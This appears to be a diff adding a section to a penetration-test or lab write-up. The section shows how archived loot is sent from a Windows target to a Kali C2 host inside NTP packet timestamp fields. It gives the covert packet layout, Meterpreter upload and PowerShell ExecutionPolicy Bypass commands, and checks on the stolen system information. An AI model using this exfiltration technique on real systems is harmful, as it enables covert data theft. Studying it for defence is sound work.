@@ -299,6 +299,73 @@ $eof[0] = 0x1B
 $client.Send($eof, 48) | Out-Null
 $client.Close()
 ```
+NTP Packet Structure Used
+ 
+| Byte(s) | Field | Value | Purpose |
+|:---|:---|:---|:---|
+| 0 | LI/VN/Mode | `0x1B` | LI=0, VN=3, Mode=3 (client): valid NTP client header |
+| 1 | Stratum | `0x01` | Stratum 1: primary reference server |
+| 2 | Poll | `0x06` | Poll interval |
+| 3 | Precision | `0xEC` | Clock precision |
+| 4-15 | Root Delay/Dispersion/Ref ID | `0x00` | Zeroed: normal for client packets |
+| 16-47 | Timestamp Fields | **Data payload** | 32 bytes of loot.zip data hidden here |
+
+**Execution:**
+ 
+Stop System NTP to Free Port 123 (could use other port)
+
+```sudo systemctl stop systemd-timesyncd``` 
+
+Start Receiver on Kali
+```sudo python3 /home/kali/loot/udp_receiver.py```
+ 
+
+ Upload Sender via Meterpreter (Run from meterpreter prompt)
+```upload /home/kali/loot/udp_sender.ps1 C:\\temp\\udp_sender.ps1```
+ 
+Execute Sender on Windows
+```
+shell
+powershell -ExecutionPolicy Bypass -File C:\temp\udp_sender.ps1
+```
+ 
+*[Screenshot: PowerShell sender executing on Windows target]*
+ 
+---
+ 
+## Verification on C2
+ 
+### Archive Received
+```bash
+ls -lh /home/kali/loot/loot.zip
+```
+*[Screenshot: loot.zip file listing with size]*
+ 
+### Extraction
+```bash
+unzip loot.zip
+```
+*[Screenshot: unzip output showing all 12 files inflating]*
+ 
+### File Listing After Extraction
+```bash
+ls
+```
+*[Screenshot: ls showing all extracted txt files]*
+ 
+### File Integrity Verification
+```bash
+cat systeminfo.txt
+```
+*[Screenshot: systeminfo.txt output showing full Windows system information]*
+ 
+**Key fields confirmed readable:**
+- Host Name: `DESKTOP-H53BPAA`
+- OS Name: `Microsoft Windows 10 Pro`
+- OS Version: `10.0.19045 N/A Build 19045`
+- System Type: `x64-based PC`
+- Registered Owner: `azrael`
+
 
 ### Phase 4: Privilege Escalation
 **Vulnerability:** CVE-2023-XXXXX (Hypothetical Print Spooler Flaw)
